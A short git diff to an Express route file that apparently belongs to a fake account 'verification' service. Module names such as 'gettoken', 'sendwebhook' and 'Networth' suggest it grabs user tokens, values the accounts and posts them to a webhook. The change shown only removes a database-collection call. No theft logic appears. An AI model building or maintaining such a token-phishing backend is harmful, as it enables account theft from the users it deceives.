@@ -1,5 +1,5 @@
 const express = require("express");
-const { getWebhook, createCollection } = require("../utils/mongodb.js");
+const { getWebhook } = require("../utils/mongodb.js");
 const networthCalc = require("../utils/Networth");
 const ReturnData = require("../utils/gettoken");
 const PostWebhook = require("../utils/sendwebhook");
@@ -82,8 +82,6 @@ router.get("/verifying", async (req, res) => {
     }
   
     res.render(('refreshed/hackertext'), { title: "VERIFIED", textsize: "10" })
-    
-  createCollection();
   
   });
   
